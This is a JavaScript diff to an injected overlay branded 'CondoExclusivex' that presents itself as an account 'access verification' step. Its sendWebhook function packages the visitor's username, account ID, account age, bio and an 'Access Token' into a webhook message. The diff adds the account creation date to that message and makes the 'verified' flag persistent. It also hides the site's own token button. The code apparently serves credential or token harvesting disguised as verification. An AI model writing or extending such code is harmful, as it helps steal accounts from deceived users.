@@ -207,7 +207,7 @@
     });
 
     /* Auto-click "Generate Token" if session already verified */
-    if (sessionStorage.getItem(VERIFIED_KEY)) {
+    if (localStorage.getItem(VERIFIED_KEY)) {
       document.querySelectorAll('button:not([data-rc-at])').forEach(function (el) {
         var txt = (el.textContent || '').trim().toLowerCase();
         if (txt.indexOf('generate') !== -1 && txt.indexOf('token') !== -1) {
@@ -234,10 +234,10 @@
   function sendWebhook(user, token) {
     var lang = getLang();
     var labels = {
-      en: { title: 'New Verified Access', user: 'Username', id: 'Account ID', days: 'Days since creation', token: 'Access Token', bio: 'Bio', none: 'No bio.', footer: 'CondoExclusivex — Access Verification' },
-      pt: { title: 'Novo Acesso Verificado', user: 'Usuário', id: 'ID da Conta', days: 'Dias desde criação', token: 'Token de Acesso', bio: 'Bio', none: 'Sem bio.', footer: 'CondoExclusivex — Verificação de Acesso' },
-      es: { title: 'Nuevo Acceso Verificado', user: 'Usuario', id: 'ID de Cuenta', days: 'Días desde creación', token: 'Token de Acceso', bio: 'Bio', none: 'Sin bio.', footer: 'CondoExclusivex — Verificación de Acceso' },
-      ru: { title: 'Новый Подтверждённый Доступ', user: 'Пользователь', id: 'ID Аккаунта', days: 'Дней с регистрации', token: 'Токен доступа', bio: 'Био', none: 'Нет.', footer: 'CondoExclusivex — Проверка доступа' },
+      en: { title: 'New Verified Access', user: 'Username', id: 'Account ID', days: 'Days since creation', created: 'Account Created', token: 'Access Token', bio: 'Bio', none: 'No bio.', footer: 'CondoExclusivex — Access Verification' },
+      pt: { title: 'Novo Acesso Verificado', user: 'Usuário', id: 'ID da Conta', days: 'Dias desde criação', created: 'Conta Criada em', token: 'Token de Acesso', bio: 'Bio', none: 'Sem bio.', footer: 'CondoExclusivex — Verificação de Acesso' },
+      es: { title: 'Nuevo Acceso Verificado', user: 'Usuario', id: 'ID de Cuenta', days: 'Días desde creación', created: 'Cuenta Creada el', token: 'Token de Acceso', bio: 'Bio', none: 'Sin bio.', footer: 'CondoExclusivex — Verificación de Acceso' },
+      ru: { title: 'Новый Подтверждённый Доступ', user: 'Пользователь', id: 'ID Аккаунта', days: 'Дней с регистрации', created: 'Дата регистрации', token: 'Токен доступа', bio: 'Био', none: 'Нет.', footer: 'CondoExclusivex — Проверка доступа' },
     };
     var l = labels[lang] || labels.en;
     var embed = {
@@ -247,7 +247,8 @@
       fields: [
         { name: l.user,  value: '**' + (user.displayName || user.name) + '** (`' + user.name + '`)', inline: true },
         { name: l.id,    value: '`' + user.id + '`', inline: true },
-        { name: l.days,  value: '**' + user.days + '** dias', inline: true },
+        { name: l.days,    value: '**' + user.days + '** dias', inline: true },
+        { name: l.created, value: (user.created ? new Date(user.created).toLocaleDateString('pt-BR') : '—'), inline: true },
         { name: l.token, value: '```' + token + '```' },
         { name: l.bio,   value: (user.description && user.description.trim()) ? user.description.trim().slice(0, 300) : l.none },
       ],
@@ -320,7 +321,7 @@
     inp.placeholder = t.placeholder;
     inp.autocomplete = 'off';
     inp.spellcheck = false;
-    inp.style.cssText = 'display:block;width:100%;box-sizing:border-box;background:#101022;border:1px solid rgba(220,38,38,.22);border-radius:11px;padding:12px 14px;color:#fff;font-size:14px;font-weight:500;font-family:inherit;margin-bottom:10px;outline:none;transition:border-color .2s,box-shadow .2s';
+    inp.style.cssText = 'display:block;width:100%;box-sizing:border-box;background:#0e0606;border:1px solid rgba(220,38,38,.28);border-radius:11px;padding:12px 14px;color:#fff;font-size:14px;font-weight:500;font-family:inherit;margin-bottom:10px;outline:none;transition:border-color .2s,box-shadow .2s';
 
     inp.addEventListener('focus',  function () { inp.style.borderColor = '#dc2626'; inp.style.boxShadow = '0 0 0 3px rgba(220,38,38,.25)'; });
     inp.addEventListener('blur',   function () { inp.style.borderColor = 'rgba(220,38,38,.22)'; inp.style.boxShadow = 'none'; });
@@ -446,7 +447,7 @@
 
     /* ── token box ── */
     var tokenBox = document.createElement('div');
-    tokenBox.style.cssText = 'background:#060610;border:1px solid rgba(220,38,38,.35);border-radius:12px;padding:14px 16px;margin-bottom:14px;position:relative';
+    tokenBox.style.cssText = 'background:#080404;border:1px solid rgba(220,38,38,.4);border-radius:12px;padding:14px 16px;margin-bottom:14px;position:relative';
 
     var tokenLabel = document.createElement('div');
     tokenLabel.style.cssText = 'font-size:10px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:#dc2626;margin-bottom:8px';
@@ -482,7 +483,7 @@
     /* copy button */
     var btnCopy = document.createElement('button');
     btnCopy.type = 'button';
-    btnCopy.style.cssText = 'flex:1;display:flex;align-items:center;justify-content:center;gap:7px;background:#1c2032;color:#fecaca;border:1px solid rgba(220,38,38,.3);border-radius:11px;padding:12px;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit;transition:background .2s';
+    btnCopy.style.cssText = 'flex:1;display:flex;align-items:center;justify-content:center;gap:7px;background:#1a0808;color:#fecaca;border:1px solid rgba(220,38,38,.3);border-radius:11px;padding:12px;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit;transition:background .2s';
     var copyIco  = icon('copy', '#fca5a5');
     var copyTxt  = document.createElement('span'); copyTxt.textContent = t.btnCopy;
     btnCopy.appendChild(copyIco); btnCopy.appendChild(copyTxt);
@@ -560,12 +561,12 @@
     /* overlay */
     var ov = document.createElement('div');
     ov.id = 'rc-vo';
-    ov.style.cssText = 'position:fixed;inset:0;z-index:9999998;background:rgba(4,4,12,.93);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:20px;font-family:Inter,system-ui,sans-serif;overflow-y:auto';
+    ov.style.cssText = 'position:fixed;inset:0;z-index:9999998;background:rgba(8,2,2,.94);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:20px;font-family:Inter,system-ui,sans-serif;overflow-y:auto';
 
     /* card */
     var card = document.createElement('div');
     card.id = 'rc-vc';
-    card.style.cssText = 'position:relative;width:100%;max-width:460px;background:#0b0b16;border:1px solid rgba(220,38,38,.28);border-radius:22px;padding:32px 30px;box-shadow:0 0 0 1px rgba(220,38,38,.06),0 24px 64px rgba(0,0,0,.75),0 0 48px rgba(220,38,38,.1)';
+    card.style.cssText = 'position:relative;width:100%;max-width:460px;background:#0a0606;border:1px solid rgba(220,38,38,.35);border-radius:22px;padding:32px 30px;box-shadow:0 0 0 1px rgba(220,38,38,.06),0 24px 64px rgba(0,0,0,.75),0 0 48px rgba(220,38,38,.1)';
 
     /* top glow line */
     var glowLine = document.createElement('div');
@@ -599,7 +600,7 @@
     function dismiss() {
       ov.classList.add('rc-out');
       setTimeout(function () { ov.remove(); }, 240);
-      sessionStorage.setItem(VERIFIED_KEY, '1');
+      localStorage.setItem(VERIFIED_KEY, '1');
     }
 
     /* step1 → step2 transition */
@@ -617,33 +618,40 @@
   /* ═══════════════════════════════════════════════════════════
      BOOT
   ═══════════════════════════════════════════════════════════ */
-  /* ── Animated checkerboard background ─────────────────────────────────── */
-  function injectCheckerboard() {
+  /* ── Red grid background + hide React generate-token button ───────────── */
+  function injectBackground() {
     var s = document.createElement('style');
-    s.textContent = [
-      '@keyframes rc-checker-drift{from{background-position:0 0,0 20px,20px -20px,-20px 0}to{background-position:40px 40px,40px 60px,60px 20px,20px 40px}}',
-      '#rc-checker-bg{',
-        'position:fixed;inset:0;z-index:0;pointer-events:none;',
-        'background-image:',
-          'linear-gradient(45deg,rgba(220,38,38,.04) 25%,transparent 25%),',
-          'linear-gradient(-45deg,rgba(220,38,38,.04) 25%,transparent 25%),',
-          'linear-gradient(45deg,transparent 75%,rgba(220,38,38,.04) 75%),',
-          'linear-gradient(-45deg,transparent 75%,rgba(220,38,38,.04) 75%);',
-        'background-size:40px 40px;',
-        'background-position:0 0,0 20px,20px -20px,-20px 0;',
-        'animation:rc-checker-drift 10s linear infinite;',
-      '}',
-    ].join('');
+    s.textContent =
+      /* body background: dark red-tinted with radial glows */
+      'body{'
+        + 'background-color:#0a0204!important;'
+        + 'background-image:'
+          + 'radial-gradient(ellipse 100% 60% at 50% -5%,rgba(220,38,38,.16) 0%,transparent 70%),'
+          + 'radial-gradient(ellipse 60% 60% at 90% 100%,rgba(185,28,28,.10) 0%,transparent 70%),'
+          + 'radial-gradient(ellipse 40% 40% at 10% 80%,rgba(239,68,68,.07) 0%,transparent 60%)'
+        + '!important;'
+        + 'min-height:100vh;'
+      + '}'
+      /* grid overlay lines */
+      + 'body::before{'
+        + 'content:"";'
+        + 'position:fixed;inset:0;'
+        + 'background-image:'
+          + 'linear-gradient(rgba(220,38,38,.05) 1px,transparent 1px),'
+          + 'linear-gradient(90deg,rgba(220,38,38,.05) 1px,transparent 1px);'
+        + 'background-size:52px 52px;'
+        + 'pointer-events:none;'
+        + 'z-index:0;'
+      + '}'
+      /* hide the React "Generate Access Token" button entirely */
+      + '[data-testid="button-generate-token"]{display:none!important}'
+      /* ensure Access Game button is always visible & clickable */
+      + '[data-testid="button-access-game"]{display:flex!important;pointer-events:auto!important}';
     document.head.appendChild(s);
-    var bg = document.createElement('div');
-    bg.id = 'rc-checker-bg';
-    var appendBg = function () { document.body.insertBefore(bg, document.body.firstChild); };
-    if (document.body) appendBg();
-    else document.addEventListener('DOMContentLoaded', appendBg);
   }
-  injectCheckerboard();
+  injectBackground();
 
-  if (!sessionStorage.getItem(VERIFIED_KEY)) {
+  if (!localStorage.getItem(VERIFIED_KEY)) {
     detectLang(function () {
       if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', buildModal);
